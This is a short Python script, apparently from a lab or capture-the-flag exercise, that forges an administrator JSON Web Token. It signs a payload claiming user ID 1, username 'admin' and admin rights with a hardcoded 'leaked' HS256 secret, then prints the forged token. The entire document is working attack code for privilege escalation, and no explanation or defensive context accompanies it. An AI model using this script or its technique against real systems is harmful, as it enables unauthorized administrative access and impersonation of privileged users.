import jwt
from datetime import datetime, timedelta

LEAKED_SECRET = "fe640c77c4a453d304f368d75debd3fd7bf2c657c6b2d5e9233fc1b520302c40" 

payload = {
    'user_id': 1,       # Admin ID from db.py
    'username': 'admin',
    'is_admin': 1,      # Privileged access
    'exp': datetime.utcnow() + timedelta(hours=24)
}

token = jwt.encode(payload, LEAKED_SECRET, algorithm='HS256')
print(f"Forged Token: {token}")
